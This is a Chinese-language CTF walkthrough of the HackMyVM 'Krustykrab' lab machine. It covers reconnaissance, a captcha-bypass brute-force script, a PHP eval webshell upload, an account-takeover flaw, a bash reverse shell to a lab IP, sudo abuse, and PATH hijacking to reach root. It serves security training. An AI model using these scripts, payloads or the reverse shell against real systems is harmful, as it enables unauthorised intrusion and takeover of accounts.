---
layout: config.default_layout
title: HackMyVM-Krustykrab
date: 2025-04-18 16:27:34
updated: 2025-04-18 16:29:16
comments: true
tags: [Linux靶机,HackMyVM,CTF,越权,路径劫持]
categories: 靶机
---

# Krustykrab.

> https://hackmyvm.eu/machines/machine.php?vm=Krustykrab
> 

Note：**who lives in a pineapple under the sea?**

## 前期踩点

```bash
➜  Krustykrab nmap -sP 192.168.56.0/24                        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-17 08:23 EDT
Nmap scan report for 192.168.56.1
Host is up (0.00038s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00021s latency).
MAC Address: 08:00:27:47:36:38 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.132
Host is up (0.00033s latency).
MAC Address: 08:00:27:DE:9C:4B (Oracle VirtualBox virtual NIC)
```

```bash
➜  Krustykrab nmap -sT -min-rate 10000 -p- 192.168.56.132         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-17 08:24 EDT
Nmap scan report for 192.168.56.132
Host is up (0.0011s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:DE:9C:4B (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 12.62 seconds
```

```bash
➜  Krustykrab nmap -sT -A -T4 -O -p 22,80 192.168.56.132 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-17 08:24 EDT
Nmap scan report for 192.168.56.132
Host is up (0.00044s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 f6:91:6b:ad:ea:ad:1d:b9:44:09:d8:74:a3:02:38:35 (ECDSA)
|_  256 b6:66:2f:f0:4c:26:7f:7d:14:ea:b3:62:09:64:a7:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 08:00:27:DE:9C:4B (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.44 ms 192.168.56.132

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.61 seconds
```

```bash
➜  Krustykrab nmap -script=vuln 22,80 192.168.56.132 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-17 21:42 EDT
Failed to resolve "22,80".
Nmap scan report for 192.168.56.132
Host is up (0.00020s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
MAC Address: 08:00:27:DE:9C:4B (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 38.03 seconds
```

## Web 渗透

### 信息收集

访问 `HTTP` 服务，`Apache` 默认页

![image.png](image.png)

没什么信息，目录爆破一波，也没什么信息

```bash
➜  Krustykrab gobuster dir -u http://192.168.56.132 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,zip -b 403,404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.132
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 11539]
Progress: 1102800 / 1102805 (100.00%)
===============================================================
Finished
===============================================================
```

检查一下源码，能找到 `/var/www/html/finexo`

![image.png](image1.png)

访问该目录

![image.png](image2.png)

`Team` 里面可以找到几个用户名，全是**海绵宝宝**里面的角色

![image.png](image3.png)

扫描以下目录

```bash
➜  Krustykrab gobuster dir -u http://192.168.56.132/finexo -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,zip -b 403,404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.132/finexo
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 324] [--> http://192.168.56.132/finexo/images/]
/index.html           (Status: 200) [Size: 27452]
/about.html           (Status: 200) [Size: 8932]
/login.php            (Status: 200) [Size: 4287]
/uploads              (Status: 301) [Size: 325] [--> http://192.168.56.132/finexo/uploads/]
/assets               (Status: 301) [Size: 324] [--> http://192.168.56.132/finexo/assets/]
/service.html         (Status: 200) [Size: 9992]
/css                  (Status: 301) [Size: 321] [--> http://192.168.56.132/finexo/css/]
/team.html            (Status: 200) [Size: 12244]
/test.php             (Status: 500) [Size: 0]
/js                   (Status: 301) [Size: 320] [--> http://192.168.56.132/finexo/js/]
/why.html             (Status: 200) [Size: 10553]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/config.php           (Status: 200) [Size: 0]
/fonts                (Status: 301) [Size: 323] [--> http://192.168.56.132/finexo/fonts/]
/dashboard            (Status: 301) [Size: 327] [--> http://192.168.56.132/finexo/dashboard/]
Progress: 1102800 / 1102805 (100.00%)
===============================================================
Finished
===============================================================
```

在 `/finexo/assets/json/` 能找到 `2500.txt` 文件，里面像是用户信息之类的东西

```
{
  "aaData": [
    [
      "1",
      "Armand",
      "Warren",
      "56045",
      "Taiwan, Province of China"
    ],
    [
      "2",
      "Xenos",
      "Salas",
      "71090",
      "Liberia"
    ],
........
```

登录页面在 `/finexo/login.php` 

![image.png](image4.png)

### 登录逻辑

测试之后，发现是存在用户**`SpongeBob`**的，不存在的其他用户都是 `User doesn't exit`

本来想绕过验证码进行登录，但是发现验证码绕不过，会提示：`Wrong Captcha`

```bash
POST /finexo/login.php HTTP/1.1
Host: 192.168.56.132
......
username=SpongeBob&password=1&captcha=wcfh
```

观察验证码逻辑，登陆会加载

![image.png](image5.png)

其中`/finexo/login.php?action=generateCaptcha` 是用来生成验证码的

![image.png](image6.png)

`/finexo/particles.js-master/dist/particles.min.js` 中发现加密后的 `js`

![image.png](image7.png)

一眼 `JsFuck` ，通过 https://www.dcode.fr/jsfuck-language 可以进行解密，解密后的内容如下

```bash
function generateCaptcha() { 
	$characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"; 
	$code = ""; 
	$seed = time(); 
	mt_srand($seed); 
	for ($i = 0; $i < 4; $i++) { 
		$code .= $characters[mt_rand(0, strlen($characters) - 1)]; 
	} 
	$_SESSION['captcha'] = strtolower($code); return $code; 
}
```

> 这个函数的核心流程：
> 
> 1. 从指定字符集合里随机选取4个字符组成验证码；
> 2. 把验证码的小写版本存入 `$_SESSION`，用于后续验证；
> 3. 返回验证码原文，通常前端页面会用这个值生成图片或者直接显示。

这里`generateCaptcha`中的`session`如果和`Login`中的`session`如果是同一个，那么就可以绕过验证码了

编写脚本验证

```bash
import requests

login_url = 'http://192.168.56.132/finexo/login.php'
code_url = 'http://192.168.56.132/finexo/login.php?action=generateCaptcha'

s = requests.session()
code = s.get(code_url).text
data = {
    'username': 'SpongeBob',
    'password': 'test',
    'captcha': code,
}
res = s.post(login_url, data)
if 'Wrong Password' in res.text:
    print('Wrong password')
else:
    print('验证码错误')
```

返回 `Wrong Password`，验证码有效

![image.png](image8.png)

### 登录爆破

编写脚本进行爆破

```bash
import requests

login_url = 'http://192.168.56.132/finexo/login.php'
code_url = 'http://192.168.56.132/finexo/login.php?action=generateCaptcha'

s = requests.session()

with open('rockyou.txt', 'r') as f:
    for line in f:
        line = line.strip()
        code = s.get(code_url).text
        data = {
            'username': 'SpongeBob',
            'password': line,
            'captcha': code,
        }
        res = s.post(login_url, data)
        if 'Wrong Password' in res.text:
            print(f'Wrong password:{line}')
        elif 'Wrong Captcha' in res.text:
            print('Wrong captcha')
        else:
            print(f'密码正确：{line}')
            break
```

正确密码是：`squarepants` ，感觉这个还可以根据用户名来猜密码…因为海绵宝宝全称就是`*SpongeBob SquarePants*`

![image.png](image9.png)

### 文件上传（兔子洞）

登陆进去

![image.png](image10.png)

有一个文件上传页面，能上传头像

![image.png](image11.png)

构造恶意数据包

```bash
------geckoformboundary4059528d1f58fd4c6ea77567d1b81073
Content-Disposition: form-data; name="profile_picture"; filename="shell.php"
Content-Type: image/png

PNG
	<?php eval($_POST[1]); ?>
```

没有任何限制，直接上传成功了

![image.png](image12.png)

但是发现会经过二次处理，上传之后的马都经过二次处理后变得无法使用

![image.png](image13.png)

### 越权

我们还可以注意到有 `New Password` 输入框

![image.png](image11.png)

数据包里面长这样

```bash
------geckoformboundary4059528d1f58fd4c6ea77567d1b81073
Content-Disposition: form-data; name="password"

123456
------geckoformboundary4059528d1f58fd4c6ea77567d1b81073
Content-Disposition: form-data; name="username"

SpongeBob
------geckoformboundary4059528d1f58fd4c6ea77567d1b81073--
```

并且在 mail 中可以发现用户 `Administratro`

![image.png](image14.png)

尝试将`SpongeBob`改为`administrator` ，提示成功

![image.png](image15.png)

尝试以 `Administratro` 用户进行登录，成功登录

![image.png](image16.png)

可以在下面找到命令执行的功能

![image.png](image17.png)

进行反弹 `shell`

```bash
/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.4/1234 0>&1'
```

```bash
➜  Krustykrab nc -lvp 1234                               
listening on [any] 1234 ...
192.168.56.132: inverse host lookup failed: Unknown host
connect to [192.168.56.4] from (UNKNOWN) [192.168.56.132] 46124
bash: cannot set terminal process group (691): Inappropriate ioctl for device
bash: no job control in this shell
www-data@KrustyKrab:/var/www/html/finexo/admin_dashborad$ 
```

## 提权

### to KrustyKrab

查看权限

```bash
www-data@KrustyKrab:/var/www/html/finexo/admin_dashborad$ sudo -l
sudo -l
Matching Defaults entries for www-data on KrustyKrab:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on KrustyKrab:
    (KrustyKrab) NOPASSWD: /usr/bin/split
```

通过 `GTFbins` 寻找利用方法

```bash
sudo -u KrustyKrab split --filter=/bin/sh -
```

可以获得 `KrustyKrab` 的 `shell`，写入公钥

```bash
echo "ssh-rsa xxxxx" > .ssh/authorized_keys
```

```bash
➜  Krustykrab ssh KrustyKrab@192.168.56.132
Linux KrustyKrab 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Mar 30 00:15:24 2025 from 192.168.56.118
KrustyKrab@KrustyKrab:~$ 
```

### to spongebob

家目录下可以读取 `user.txt`

```
KrustyKrab@KrustyKrab:~$ cat user.txt
dcc8b0c111c9fa1522c7abfac8d1864b
```

查看 sudo 权限

```bash
KrustyKrab@KrustyKrab:~$ sudo -l
Matching Defaults entries for KrustyKrab on KrustyKrab:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User KrustyKrab may run the following commands on KrustyKrab:
    (spongebob) NOPASSWD: /usr/bin/ttteeesssttt
```

海绵宝宝忘记怎么做蟹黄包了，你快帮帮他

```bash
KrustyKrab@KrustyKrab:~$ sudo -u spongebob /usr/bin/ttteeesssttt

Spongebob forgot how to make Krabby Patty, You need to help him!

Current shuffled recipe order:
A: Mustard
B: Onion
C: Ketchup
D: Lettuce
E: Cheese
F: Pickles
G: Top bun
H: Patty
I: Tomato
J: Bottom bun

Please enter the correct order using letters (e.g., ABCDEFGHIJ):
Enter 10 letters (A-J): 
```

当前目录下还有一个文件 `help` ，是一个 `GIF` 文件

```bash
KrustyKrab@KrustyKrab:~$ file help
help: GIF image data, version 89a, 480 x 270
```

![help.gif](help.gif)

刚好是蟹黄包配方：面包、肉饼、生菜、奶酪、洋葱、西红柿、番茄酱、芥末、腌椰菜、面包

```bash
......
Enter 10 letters (A-J): JHDEBICAFG

Validation successful! Perfect Krabby Patty!
spongebob@KrustyKrab:/home/KrustyKrab$ 
```

顺序正确后得到了`spongebob`的`shell`

写入公钥

```bash
echo "ssh-rsa xxxxx" > .ssh/authorized_keys
```

### to Krustykrab

`spongebob` 的家目录下存在

```bash
spongebob@KrustyKrab:~$ ls
key1  key2.jpeg  note.txt
```

- key1
    
    ```bash
    spongebob@KrustyKrab:~$ cat key1
    e1964798cfe86e914af895f8d0291812
    ```
    
- note.txt
    
    ```bash
    spongebob@KrustyKrab:~$ cat note.txt 
    
    Squidward is waiting for you!!!!
    
    password is md5($key1$key2).
    
    It's not so hard as you think.
    ```
    
- key2.jpeg
    
    ![key2.jpeg](key2.jpeg)
    

看着像是图片隐写，但是没分离出来什么东西

尝试将 `key1` 加上该图片的 MD5 值进行计算

```bash
➜  Krustykrab cat key2.jpeg | md5sum
5e1d0c1a168dc2d70004c2b00ba314ae  -
➜  Krustykrab echo -n "e1964798cfe86e914af895f8d02918125e1d0c1a168dc2d70004c2b00ba314ae" | md5sum
7ac254848d6e4556b73398dde2e4ef82  -
```

竟然登陆成功了

```bash
➜  Krustykrab ssh Squidward@192.168.56.132                                                    
Squidward@192.168.56.132's password: 
Linux KrustyKrab 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Mar 30 00:12:09 2025 from 192.168.56.118
$ 
```

### to root

当前目录下存在 `laststep`

执行，给 `shadow` 文件读出来了

```bash
./laststep
root:$y$j9T$xm9zjJdLydmP9yMp9Nj3C0$RK1zpq.FysZjb30c5IUWzUi.BWYvIUsygxhgsyvyzO3:20174:0:99999:7:::
daemon:*:19549:0:99999:7:::
bin:*:19549:0:99999:7:::
sys:*:19549:0:99999:7:::
sync:*:19549:0:99999:7:::
games:*:19549:0:99999:7:::
man:*:19549:0:99999:7:::
lp:*:19549:0:99999:7:::
mail:*:19549:0:99999:7:::
news:*:19549:0:99999:7:::
uucp:*:19549:0:99999:7:::
proxy:*:19549:0:99999:7:::
www-data:*:19549:0:99999:7:::
backup:*:19549:0:99999:7:::
list:*:19549:0:99999:7:::
irc:*:19549:0:99999:7:::
_apt:*:19549:0:99999:7:::
nobody:*:19549:0:99999:7:::
systemd-network:!*:19549::::::
systemd-timesync:!*:19549::::::
messagebus:!:19549::::::
avahi-autoipd:!:19549::::::
sshd:!:19549::::::
mysql:!:20171::::::
KrustyKrab:$y$j9T$v3iavPLpYl5ezsR4pMSjc0$bPxk2s3wxGrhgv4PpFbYVP9sy4ERDnAzf14Ud.p1Iq4:20174:0:99999:7:::
spongebob:$y$j9T$QMeIdDraDWE0L5C65y6SN1$JqifleH2vWxsHdW.1eZHTLEhqluSDP7RKOPhKdpGip8:20174:0:99999:7:::
Squidward:$y$j9T$G4aYhd9T1rT4dzeu06RZZ1$mbjej1b0wgbrF.KlZrP6WafH5tI9ssL8ztqEDDC2tD7:20174:0:99999:7:::
```

拿出来分析一下，很简单

```bash
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setgid(0);
  setuid(0);
  system("cat /etc/shadow");
  return 0;
}
```

`cat` 没有使用绝对路径，可以尝试路径劫持

```bash
$ env
USER=Squidward
SSH_CLIENT=192.168.56.4 47710 22
XDG_SESSION_TYPE=tty
HOME=/home/Squidward
MOTD_SHOWN=pam
SSH_TTY=/dev/pts/2
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1002/bus
LOGNAME=Squidward
XDG_SESSION_CLASS=user
TERM=tmux-256color
XDG_SESSION_ID=25
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
XDG_RUNTIME_DIR=/run/user/1002
LANG=en_US.UTF-8
SHELL=/bin/sh
PWD=/home/Squidward
SSH_CONNECTION=192.168.56.4 47710 192.168.56.132 22
$ export PATH=.:$PATH
```

创建恶意 `cat` 文件 `cat.c`

```bash
#include <stdlib.h>

int main() {
    system("/bin/bash");
    return 0;
}
```

```bash
$ gcc cat.c -o cat
$ ./laststep
root@KrustyKrab:~# 
```

读取 `root.txt`

```bash
root@KrustyKrab:/root# cat root.txt 
efe397e3897f0c19ef0150c2b69046a3
```